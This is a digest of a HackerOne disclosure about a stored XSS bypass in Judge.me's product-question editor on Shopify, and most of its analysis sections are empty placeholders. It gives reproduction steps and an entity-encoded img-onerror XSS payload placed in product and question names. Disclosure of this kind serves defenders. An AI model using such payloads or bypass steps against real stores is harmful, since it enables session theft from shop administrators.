# Stored XSS in Question edit for product name (bypass #1416672)

## Metadata
- **Source:** HackerOne
- **Report:** 1428207 | https://hackerone.com/reports/1428207
- **Submitted:** 2021-12-15
- **Reporter:** chupa__chups
- **Program:** Unknown
- **Bounty:** $500
- **Severity:** medium
- **Vuln:** Cross-site Scripting (XSS) - Stored
- **CVEs:** None
- **Category:** web-api

## Summary
Hi @judgeme!
Step to reproduce:
1. Log in to your shopify account and create product with name `&#34;&#62;&#60;&#34;&#62;&#60;img src=x onerror=prompt(document.domain)&#62; img src=x onerror=prompt(document.domain)&#62;`
2. Go to our store and write question to our product with name `&#34;&#62;&#60;&#34;&#62;&#60;img src=x onerror=prompt(document.domain)&#62; img src=x onerror=prompt(document.doma

## Attack scenario
*(see original)*

## Root cause
*(see original)*

## Attacker mindset
*(see original)*

## Defensive takeaways
*(see original)*

## Variant hunting
*(see original)*

## MITRE ATT&CK
*(see original)*

## Notes
*(see original)*

## Full report
<details><summary>Expand</summary>

Hi @judgeme!
Step to reproduce:
1. Log in to your shopify account and create product with name `&#34;&#62;&#60;&#34;&#62;&#60;img src=x onerror=prompt(document.domain)&#62; img src=x onerror=prompt(document.domain)&#62;`
2. Go to our store and write question to our product with name `&#34;&#62;&#60;&#34;&#62;&#60;img src=x onerror=prompt(document.domain)&#62; img src=x onerror=prompt(document.domain)&#62;`
3. Then delete our product from store (The product status must be (out of store) in questions.
4. Then go to Shopify admin/Judge.me Product Reviews/Questions and edit question. XSS triage


{F1547145}


POC video

{F1547181}

## Impact

session stealer

</details>

---
*Analysed by Claude on 2026-05-24*
